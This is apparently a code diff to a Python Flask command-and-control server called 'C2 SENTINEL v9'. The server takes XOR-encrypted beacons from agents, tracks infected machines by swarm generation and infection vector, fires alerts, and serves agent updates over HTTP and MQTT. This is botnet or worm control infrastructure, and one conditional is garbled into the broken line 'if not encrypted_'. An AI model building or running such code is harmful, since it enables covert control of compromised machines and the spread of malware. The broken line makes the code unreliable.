+            rtype = r.get("type", "beacon")
             severity = "🔴 HIGH" if is_high_severity(r) else "🟢 LOW"
             sev_color = "#ff3366" if is_high_severity(r) else "#00ff00"
-            logs.append(f'<span style="color:{sev_color};">[{ts}]</span> <b>[{agent}]</b> {severity} | {issue}')
+            logs.append(f'<span style="color:{sev_color};">[{ts}]</span> <b>[{agent}]</b> {severity} | Type: {rtype} | {issue}')
 
         content = f'''
         <h2>📜 LIVE LOGS — NEURAL FEED</h2>
@@ -1344,7 +1192,7 @@ def live_logs():
 @app.route('/beacon', methods=['POST'])
 def beacon():
     encrypted_data = request.form.get('data')
-    if not encrypted_data:  # ✅ PERBAIKAN UTAMA: typo diperbaiki
+    if not encrypted_
         return "Invalid", 400
 
     decrypted = xor_decrypt(encrypted_data)
@@ -1362,11 +1210,15 @@ def beacon():
         if agent_id not in AGENT_SWARM_MAP:
             existing_agents = list(AGENT_SWARM_MAP.keys())
             parent = random.choice(existing_agents) if existing_agents else "ROOT"
+            swarm_gen = data.get("system", {}).get("swarm_generation", 0)
+            infected_via = data.get("system", {}).get("infected_via", "manual")
             AGENT_SWARM_MAP[agent_id] = {
                 "parent": parent,
                 "children": [],
                 "ip": data.get("ip", "unknown"),
-                "first_seen": data["timestamp"]
+                "first_seen": data["timestamp"],
+                "generation": swarm_gen,
+                "infected_via": infected_via
             }
             if parent != "ROOT" and parent in AGENT_SWARM_MAP:
                 AGENT_SWARM_MAP[parent]["children"].append(agent_id)
@@ -1390,7 +1242,6 @@ def beacon():
             alert += f"🆔 Agent: {agent_id}\n"
             alert += f"🎯 Target: {data.get('target', 'unknown')}\n"
             alert += f"🔧 Issue: {data.get('issue', 'unknown')}\n"
-            alert += f"💰 Potensi Bounty: HIGH\n"
             alert += f"🕒 Waktu: {data['timestamp']}"
             send_alert(alert)
             socketio.emit('new_alert', {"message": f"Critical issue found by {agent_id}: {data.get('issue', 'unknown')}"})
@@ -1414,7 +1265,7 @@ def update():
     update_file = "agent_new.py"
     if not os.path.exists(update_file):
         with open(update_file, "w") as f:
-            f.write('''print("✅ Agent updated to v9.0 - HIVE.MQ NEURAL SWARM EDITION!")\n''')
+            f.write('''print("✅ Agent updated to v9.0 - HIVE.MQ SWARM EDITION!")\n''')
     return send_file(update_file)
 
 @app.route('/analytics')
@@ -1634,12 +1485,10 @@ def handle_disconnect():
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 8000))
     print("="*70)
-    print("🚀🚀🚀 C2 SENTINEL v9 — HIVE.MQ NEURAL SWARM ULTIMATE EDITION")
+    print("🚀🚀🚀 C2 SENTINEL v9 — HIVE.MQ SWARM COMMAND CENTER")
     print(f"🌐 Running on http://0.0.0.0:{port}")
     print(f"🔐 XOR Key: '{XOR_KEY}'")
     print(f"📡 MQTT Broker: {MQTT_HOST}:{MQTT_PORT}")
-    print(f"   → Subscribe: {MQTT_TOPIC_REPORT}")
-    print(f"   → Publish cmd: c2/agent/<agent_id>/cmd")
     print("🤖 Neural AI + Auto Command + Swarm Map + 3D Vis + MQTT + WS — ALL ACTIVE")
     print("="*70)
 
